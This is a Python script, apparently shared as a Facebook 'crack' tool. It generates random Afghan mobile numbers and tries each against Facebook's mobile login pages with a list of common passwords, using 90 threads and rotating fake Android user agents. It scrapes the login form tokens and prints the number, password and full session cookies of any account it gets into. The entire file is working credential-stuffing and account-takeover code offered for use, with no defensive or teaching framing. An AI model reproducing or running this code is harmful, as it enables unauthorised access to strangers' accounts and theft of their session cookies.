import os,re,uuid,json,sys,random, string,time
from concurrent.futures import ThreadPoolExecutor as ThreadPool


try:
    import rich
except:
    print("\n[!?] Installing Rich...\n")
    os.system("pip install rich")
    import rich

try:
    import requests
except:
    print("\n[!?] Installing Requests...\n")
    os.system("pip install requests")
    import requests

try:
    import httpx
except:
    print("\n[!?] Installing Httpx...\n")
    os.system("pip install httpx")
    import httpx

try:
    import bs4
except:
    print("\n[!?] Installing Bs4...\n")
    os.system("pip install bs4")
    import bs4



from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
pretty.install()

logo="""[dim purple]  ___  ____    __    ___  _  _   
 / __)(  _ \  /__\  / __)( )/ )  
( (__  )   / /(__)\( (__  )  (   
 \___)(_)\_)(__)(__)\___)(_)\_)  
"""


ugen=[]
for x in range(1000):
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

loop=0
ok=[]
info={
"FACEBOOK":"PY HXRON",
"GITHUB":"TEAM-ELITE1",
}

def main():
    user=[]
    os.system("clear")
    print(Panel.fit(logo))
    print(Panel.fit("[bold bright_yellow] m , mbasic, p, x, free, touch, d", title="[bold bright_green]CHOOSE MATHOD"))
    mmm=input(" Choice Mathod-> ")
    mm=mmm.lower()
    if mm in ["m","mbasic","p","x","free","touch","d"]:
        fb=mm
    else:
        print(" [✓] Choose Right One")
        time.sleep(3)
        main()
    os.system("clear")
    print(Panel.fit(logo))
    print_json(data=info)
    code=random.choice(["+9377","+9378"])
    Lim=int(input("[✓] Crack limit:"))
    for i in range(Lim):
        numx=''.join(random.choice(string.digits) for _ in range(7))
        user.append(numx)
    with ThreadPool (max_workers=90) as heron:
        tl=str(len(user))
        os.system("clear")
        print(Panel.fit(logo))
        print_json(data=info)
        print(Panel.fit("    YOUR CRACK IS STARTED BRO    "))
        
        print("\n\n")
        for v in user:
            uid=code+v
            pwx=[v,"10002000","500500","khankhan","Afghanistan","afghanistan","afghan123","Afghan123","kabul123","100200"]
            heron.submit(need,uid,pwx,fb,tl)
    print("\n\nCrack complete bro...")
    sys.exit()


def need(uid,pwx,fb,tl):
    global ok,ugen,loop
    session=requests.session()
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;91m{str(len(ok))}\33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            uuu=random.choice(ugen)
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                hh=str(len(ok))
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15]
                print(f"\r\r\n\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
                ok.append(uid)
                break
            
            else:
                continue
        loop+=1
    except:
        time.sleep(15)

main()

